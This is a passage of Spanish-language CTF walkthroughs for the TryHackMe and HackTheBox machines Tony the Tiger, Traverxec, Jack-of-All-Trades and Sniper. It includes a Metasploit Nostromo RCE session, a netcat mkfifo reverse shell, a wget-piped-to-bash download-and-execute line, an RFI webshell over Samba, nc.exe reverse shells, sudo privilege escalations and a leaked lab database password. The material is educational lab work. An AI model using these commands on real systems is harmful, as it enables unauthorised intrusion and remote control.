GSSAPI | DIGEST-MD5 | NTLM | thm-java-deserial | SSLSessionReq: | GSSAPI | CRAM-MD5 | NTLM | DIGEST-MD5 | thm-java-deserial | TerminalServerCookie: | CRAM-MD5 | GSSAPI | NTLM | DIGEST-MD5 |_ thm-java-deserial 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: | Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS | Potentially risky methods: PUT DELETE TRACE |_ See https://nmap.org/nsedoc/scripts/ajp-methods.html 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-methods: |_ Potentially risky methods: PUT DELETE TRACE |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache-Coyote/1.1 |_http-title: Welcome to JBoss AS 8083/tcp open http JBoss service httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port1099-TCP:V=7.80%I=7%D=4/17%Time=5E9A4F92%P=x86_64-pc-linux-gnu%r(NU ... [ snip ] ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 17 19:54:24 2020 -- 1 IP address (1 host up) scanned in 73.17 seconds HTTP Encontramos una pagina corriendo en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15 -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /404.html (Status: 200) /categories (Status: 301) /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /page (Status: 301) /posts (Status: 301) /server-status (Status: 403) /sitemap.xml (Status: 200) /tags (Status: 301) En la pagina encontramos una imagen, la descargamos y utilizamos strings para buscar nuestra flag.\nHTTP 8080 Encontramos una pagina corriendo en el puerto 8080.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15:8080 -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt,jsp /css (Status: 302) /favicon.ico (Status: 200) /images (Status: 302) /index.html (Status: 200) /index.html (Status: 200) /jbossws (Status: 302) /jmx-console (Status: 302) /manager (Status: 302) /WEB-INF (Status: 302) JBoss - JexBoss Tool Como pudimos ver en la pagina en el puerto 8080 esta corriendo JBoss, y vemos la version en /jbossws/.\nUtilizamos Jexboss para verificar si la maquina es vulnerable y automatizar un ataque. Nos muestra que tiene varias vulnerabilidades.\nMientras nuestra herramienta verifica las vulnerabilidades, tambien nos da la opcion de explotar la maquina, en este caso utilizamos JMXInvokerServlet para obtener una shell inversa, ingresando nuestra IP y el puerto que tenemos a la escucha con Netcat.\nNetcat\nUSER - CMNATIC Logramos obtener una shell inversa con el usuario cmnatic y nuestra flag user.txt en la carpeta principal de jboss.\nUSER - JBOSS En la carpeta de este usuario encontramos una nota en la que contiene una contraseña, al utilizarla en el servicio de SSH logramos obtener una shell.\nSSH\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando find. Utilizamos find para obtener una shell root.\nFind\nLogramos obtener una shell root, econtramos nuestra ultima flag root.txt pero al parecer esta codificada.\nAl decodificar nuestra flag nos devuelve un hash, utilizamos crackstation para obtener el texto.\nCrackstation\n","description":"Tony the Tiger es una maquina de TryHackMe, explotamos una vulnerabilidad en JBoss con JexBoss Tool para acceder a la maquina. Accedimos con un segundo usuario utilizando contraseñas almacenadas. Finalmente escalamos privilegios utilizando Find e informacion de GTFOBins.","id":147,"section":"posts","tags":["JexBoss"],"title":"TryHackMe - Tony the Tiger","uri":"https://sckull.github.io/posts/tonythetiger/"},{"content":"\rTraverxec es una maquina de HackTheBox. Nos topamos con Nostromo y una vulnerabilidad que explotamos con Metasploit. Accedimos con un segundo por SSH tras enumerar y crackear un archivo comprimido que contenia una clave privada. Escalamos privilegios utilizando JournalCtl.\nInformacion de la Maquina Nombre Traverxec OS Linux Puntos 20 Dificultad Facil IP 10.10.10.165 Maker jkr\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.4, 5.4, 7.2, 2.8, 4.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[3, 5, 7, 3, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp, nmap y masscan nos muestran el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 root@aoiri:~/htb/traverxec# masscan -p1-65535,U:1-65535 10.10.10.165 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-30 05:12:44 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.165 Discovered open port 80/tcp on 10.10.10.165 # Nmap 7.80 scan initiated Sun Dec 29 23:09:53 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.28s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Sun Dec 29 23:12:05 2019 -- 1 IP address (1 host up) scanned in 132.10 seconds # Nmap 7.80 scan initiated Sun Dec 29 23:12:40 2019 as: nmap -sV -sC -p22,80 -o nmap_scan_pr 10.10.10.165 Nmap scan report for 10.10.10.165 Host is up (0.080s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Dec 29 23:13:00 2019 -- 1 IP address (1 host up) scanned in 19.96 seconds HTTP - Puerto 80 Nos muestra una pagina web de una persona.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.\n1 2 3 4 5 6 7 8 9 10 root@aoiri:~/htb/traverxec# gobuster dir -u http://10.10.10.165/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t 15 -q /css (Status: 301) /empty.html (Status: 200) /icons (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /lib (Status: 301) /Readme.txt (Status: 200) WHATWEB Utilizamos esta herramienta para concoer que tipo de webserver esta corriendo en el puerto 80.\nNOSTROMO - RCE Buscamos si existe una vulnerabilidad para este webserver encontramose una y es del tipo RCE (cve-2019-16278). Utilizamos metasploit para configurarlo, obtenemos una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 msf5 \u0026gt; use exploit/multi/http/nostromo_code_exec msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; show options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; set rhosts 10.10.10.165 rhosts =\u0026gt; 10.10.10.165 msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.67 msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; show options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.165 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.67 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) msf5 exploit(multi/http/nostromo_code_exec) \u0026gt; run USER - David Realizamos una enumeracion de los directorios en la maquina encontramos un archivo (.httpasswd) en el directorio de nostromo que contiene una contraseña encriptada en md5crypt.\nDesencriptamos la contraseña con john pero al intentar utilizarla en ssh no funcionó.\nJohn:\nSSH:\nEn el mismo directorio encontramos un archivo de configuracion de nostromo en el que esta definido ciertos parametros para el webserver.\nnhttpd.conf\nSegun la documentacion, los parametros definidos con homedirs son las carpetas de usuarios que pueden ser accedidos a traves de HTTP utilizando ~nombreUsuario en la url.\n1 2 3 4 # HOMEDIRS [OPTIONAL] homedirs\t/home homedirs_public\tpublic_www En el caso de nuestra maquina podemos acceder a la carpeta del usuario david con ~david.\nComo podemos observar podemos acceder a la carpeta del usuario david, más no por medio de una shell ya que no tenemos los permisos suficientes, de igual forma existe otro parametro homedirs_public esta carpeta definida esta dentro de la carpeta de homedirs definida anteriormente, por lo que podemos acceder a esta desde nuestro navegador y desde nuestra shell.\nVemos que hay un backup de ssh, accedemos desde nuestro navegador a la carpeta /~david/protected-file-area/, nos pedira una contraseña y un usuario, utilizamos las credenciales crackeadas anteriormente y podemos ver y descargar el archivo.\nUtilizamos la clave privada para iniciar sesion, pero esta, esta protegida encriptada, utilizamos ssh2john para obtener el hash y crackear la frase, luego de esto usamos la frase con el usuario david y la llave privada atraves de ssh y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Dentro de la carpeta de David encontramos un archivo bash que ejecuta ciertos binarios o comandos del sistema, pero vemos que journalctl es ejecutado junto a sudo y cat. Intentamos enumerar los ficheros que pueden ser ejecutados junto a sudo con el usuario David pero no tenemosla contraseña de este.\n1 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat Para obtener una shell, ejecutamos sudo con journalctl tal y como se ejecuta en el archivo bash, luego de eso escribimos !/bin/sh y obtenemos shell con usuario root y nuestra flag root.txt.\nSegun Gtfobins al ejecutar journalctl, este, ejecuta lo que parece ser less, por lo que pudimos abrir una shell con el comando !/bin/sh.\n","description":"Traverxec es una maquina de HackTheBox. Nos topamos con Nostromo y una vulnerabilidad que explotamos con Metasploit. Accedimos con un segundo por SSH tras enumerar y crackear un archivo comprimido que contenia una clave privada. Escalamos privilegios utilizando JournalCtl.","id":148,"section":"posts","tags":["nostromo","metasploit"],"title":"Hack The Box - Traverxec","uri":"https://sckull.github.io/posts/traverxec/"},{"content":"\rJack-of-All-Trades es una maquina de TryHackMe, SSH está presente en un puerto diferente y en el puerto 22 vemos una pagina web con algunos retos CTF Like que nos dieron acceso al usuario Jack y, con la ejecucion de un binario con permisos SUID obtuvimos la flag root.\nRoom Titulo Jack-of-All-Trades Descripción Boot-to-root originally designed for Securi-Tay 2020 Puntos 60 Dificultad Facil Maker MuirlandOracle NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (80) y el puerto http (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # Nmap 7.80 scan initiated Wed Apr 8 17:56:03 2020 as: nmap -sV -sC -o nmap_scan 10.10.111.123 Nmap scan report for 10.10.111.123 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Jack-of-all-trades! |_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 80/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA) | 2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA) | 256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA) |_ 256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 8 17:57:19 2020 -- 1 IP address (1 host up) scanned in 76.06 seconds HTTP Al visitar el puerto 80 nos muestra un error nuestro navegador.\nLa IP esta activa, solo el puerto en el que esta corriendo Apache es el 22 y no el 80, se puede configurar el puerto en firefox dentro de about:config creando un string de configuracion.\nAhora si podemos visitar la pagina y nos muestra lo siguiente.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@upset:~/thm/jack-of-All-Trades# gobuster dir -u http://10.10.111.123:22/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q /.htpasswd (Status: 403) /.htpasswd.html (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.php (Status: 403) /.hta (Status: 403) /.hta.txt (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /assets (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /recovery.php (Status: 200) /server-status (Status: 403) root@upset:~/thm/jack-of-All-Trades# En el index de la pagina encontramos varias cosas interesantes en el codigo fuente.\nVemos un comentario que al decodificarlo en base64 nos muestra un mensaje.\nNos dirigimos a /recovery.php e intentamos utilizar la contraseña con Johny Grave y combinacion del nombre pero no nos deja ingresar.\nVemos en el codigo fuente una string codificada.\nGQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= Utilizamos base32 y hex para decodificar la cadena, lo cual nos devuelve una nueva cadena cifrada, esta vez al parecer es Caesar Cipher.\ndcode.fr tiene una herramienta muy util que nos ayudó a decifrar el mensaje, CAesar Cipher.\nEl link que nos menciona el mensaje nos redirige a una pagina de wikipedia con el nombre de Stegosauria, si recordamos en el index hay una imagen con un nombre parecido. Intentamos con steganografia en la imagen utilizando steghide.\nObtenemos un archivo que nos indica que vamos por buen camino pero la imagen no es la correcta. Hacemos lo mismo con las otras dos imagenes del index, y obtuvimos un archivo con credenciales en la imagen header.jpg.\nIngresamos al panel de /recovery.php y vemos un mensaje.\nLe pasamos un comando al parametro cmd y logramos ejecutar el comando.\nAhora que podemos ejecutar comandos, utilizamos esta ventaja para obtener una shell inversa, primero creamos un archivo el que contenga nuestro comando para nuestra shell.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.1.72 1338 \u0026gt;/tmp/f Creamos un pequeño servidor http con python3 python3 -m http.server 80. Ejecutamos el siguiente comando para obtener nuestra shell.\nbash -c \u0026#34;$(wget -qO- 10.8.1.72/shell.sh)\u0026#34; Y ponemos a la escucha netcat en nuestra maquina rlwrap nc -lvp 1338 y obtenemos nuestra shell.\nUSER - JACK Dentro del directorio /home encontramos una lista de posibles contraseñas que parecen ser del usuario jack.\nUtilizamos hydra con la lista de posibles contraseñas en el servicio SSH utilizando el puerto 80, logramos encontrar la contraseña.\nUtilizamos ssh y obtenemos una shell.\nVemos una imagen, la pasamos a nuestra maquina con netcat, abrimos la imagen y vemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos los binarios que puedan ayudar a obtener una shell con privilegios root, encontramos strings con el cual podemos leer archivos.\nUtilizamos strings para obtener nuestra flag /root/root.txt.\n","description":"Jack-of-All-Trades es una maquina de TryHackMe, SSH está presente en un puerto diferente y en el puerto 22 vemos una pagina web con algunos retos CTF Like que nos dieron acceso al usuario Jack y, con la ejecucion de un binario con permisos SUID obtuvimos la flag root.","id":149,"section":"posts","tags":["caesar","steganography","steghide","suid","hydra"],"title":"TryHackMe - Jack-of-All-Trades","uri":"https://sckull.github.io/posts/jackofalltrades/"},{"content":"\rDescubrimos una vulnerabilidad LFI/RFI en el blog donde ejecutamos una shell inversa utilizando una WebShell. Cambiamos al siguiente usuario utilizando PowerShell y credenciales almacenadas. Creando un archivo CHM y tras ser ejecutado escalamos privilegios.\nInformacion de la Maquina Nombre Sniper OS Windows Puntos 30 Dificultad Media IP 10.10.10.151 Maker MinatoTW felamos Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.5, 7.8, 5.4, 4.6, 2.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 9, 2, 8, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-15 18:34:38 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.151 Discovered open port 135/tcp on 10.10.10.151 Discovered open port 49667/tcp on 10.10.10.151 Discovered open port 139/tcp on 10.10.10.151 # Nmap 7.80 scan initiated Wed Jan 15 12:30:50 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.151 Nmap scan report for 10.10.10.151 Host is up (0.24s latency). Not shown: 65530 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 8h01m11s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-16T02:36:27 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jan 15 12:35:53 2020 -- 1 IP address (1 host up) scanned in 303.66 seconds HTTP En el puerto 80 corriendo IIS con una pagina web.\nGOBUSTER Escaneo de directorios y archivos con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /Blog (Status: 301) /blog (Status: 301) /css (Status: 301) /images (Status: 301) /Images (Status: 301) /index.php (Status: 200) /Index.php (Status: 200) /index.php (Status: 200) /js (Status: 301) /user (Status: 301) /blog/ 1 2 3 4 5 6 7 8 root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/blog/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /css (Status: 301) /error.html (Status: 200) /header.html (Status: 200) /Index.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /js (Status: 301 /user/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/user/ -w /usr/share/wordlists/dirb/common.txt -t 15 -x asp,aspx,php,html,txt -q /auth.php (Status: 302) /css (Status: 301) /db.php (Status: 200) /DB.php (Status: 200) /fonts (Status: 301) /Images (Status: 301) /images (Status: 301) /index.php (Status: 302) /Index.php (Status: 302) /index.php (Status: 302) /js (Status: 301) /login.php (Status: 200) /Login.php (Status: 200) /logout.php (Status: 302) /registration.php (Status: 200) /vendor (Status: 301) Encontramos dos rutas distintas donde estan almacenadas dos paginas diferentes, una donde se muestra un panel de inicio de sesion y la otra nos muestra una pagina con algunos articulos.\n/user/ /blog/ LFI-RFI -\u0026gt; Shell IUSR En la pagina de /blog/ encontramos que, al cambiar de idioma se le pasa como parametro un archivo existente a lang, a la pagina.\nAl realizar una consulta/archivo que no exista en la maquina nos muestra un mensaje de error, esto quiere decir que debe de existir el archivo en la maquina.\nIntentamos todos los payloads que pudiesen afectar a esta vulnerabilidad pero ninguno funciono, por lo que para explotar esta vulnerabilidad utilizamos un servidor SAMBA para pasarle como parametro una webshell desde nuestra maquina.\nConfiguracion de Servidor SAMBA:\n1 2 3 4 5 apt-get install samba mkdir /var/www/html/pub/ chmod 0555 /var/www/html/pub/ chown -R nobody:nogroup /var/www/html/pub/ touch \u0026gt; /etc/samba/smb.conf /etc/samba/smb.conf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [global] workgroup = WORKGROUP server string = Samba Server %v netbios name = indishell-lab security = user map to guest = bad user name resolve order = bcast host dns proxy = no bind interfaces only = yes [test] path = /var/www/html/pub writable = yes guest ok = yes guest only = yes read only = yes directory mode = 0555 force user = nobody service smbd restart Acceder a:\n\\\\10.10.10.10\\test\\ La webshell que utilizamos es WhiteWinterWolf - Webshell. Una vez terminado nuestra configuracion le pasamos a la pagina nuestra IP junto con el SHARENAME y la webshell, y logramos ejecuar comandos con el usuario IUSR.\nAhora que podemos ejecutar comandos vamos a obtener una shell inversa utilizando netcat (nc.exe) en la misma carpeta donde colocamos nuestra webshell. Utilizamos el siguiente comando:\n1 \\\\10.10.15.244\\test\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.244 443 Obtenemos una shell con el usuario IUSR.\nUSER - Chris Enumeramos los archivos que se encuentran en ambas paginas (blog, user) y encontramos en user un archivo de php en el que se encuentran las credenciales para la base de datos.\nCredenciales:\n1 2 Host, User, Password, DB \u0026#34;localhost\u0026#34;,\u0026#34;dbuser\u0026#34;,\u0026#34;36mEAhz/B8xQ~2VM\u0026#34;,\u0026#34;sniper\u0026#34; Dentro de las carpetas de Usuarios (C:\\Users) encontramos a Chris como uno de los usuarios, utilizamos la contraseña de la base de datos con el usuario Chris para verificar que tenga permisos de escritura en la maquina atraves de samba con smbmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.151... [+] IP: 10.10.10.151:445\tName: 10.10.10.151 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin C$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-368-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1e4-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-408-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-598-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-a2c-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\ttrkwks fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-270-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-284-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tROUTER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132236907993416575.1908.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiisipmbed63cd4-5a7a-4011-8a3f-7ca5d2834ac3 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tiislogpipe3e6fd272-542c-4985-87e5-bd930a7401e4 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237251159401733.1252.DefaultAppDomain.powershell fr--r--r-- 1 